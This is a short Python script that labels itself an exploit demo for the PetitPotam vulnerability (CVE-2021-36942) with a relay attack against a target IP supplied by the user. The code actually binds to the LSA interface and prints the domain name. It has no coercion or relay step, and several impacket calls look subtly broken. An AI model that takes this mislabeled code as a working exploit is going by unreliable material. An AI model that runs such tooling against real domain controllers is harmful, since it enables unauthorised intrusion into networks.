import argparse
from impacket.dcerpc.v5 import transport, lsad
from impacket.dcerpc.v5 import samr

# PetitPotam Vulnerability Exploitation Demo CLI
# This tool demonstrates exploiting the CVE-2021-36942 vulnerability (PetitPotam) by performing a relay attack.
# Created by milosilo

def exploit_cve_2021_36942(target_ip, target_port, target_netbios_name):
    try:
        string_binding = f"ncacn_ip_tcp:{target_ip}[{target_port}]"
        rpctransport = transport.DCERPCTransportFactory(string_binding)
        rpctransport.set_dport(target_port)
        rpctransport.setRemoteHost(target_ip)
        rpctransport.connect()

        dce = rpctransport.DCERPC_class(rpctransport)
        dce.bind(lsad.MSRPC_UUID_LSAD)
        
        policy_handle = lsad.hLsarOpenPolicy2(dce, target_netbios_name, lsad.POLICY_LOOKUP_NAMES)

        resp = lsad.hLsarQueryInformationPolicy2(dce, policy_handle, lsad.POLICY_INFORMATION_CLASS.PolicyDnsDomainInformation)
        
        print(f"Domain name retrieved: {resp['DnsDomainName']}")
        dce.disconnect()

    except Exception as e:
        print(f"Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="CVE-2021-36942 Vulnerability Exploitation Demo CLI")
    parser.add_argument("target_ip", help="IP address of the target system")
    parser.add_argument("target_port", type=int, help="Port number for the target system")
    parser.add_argument("target_netbios_name", help="NetBIOS name of the target system")

    args = parser.parse_args()

    print("Exploiting the CVE-2021-36942 vulnerability...")
    exploit_cve_2021_36942(args.target_ip, args.target_port, args.target_netbios_name)

if __name__ == "__main__":
    main()
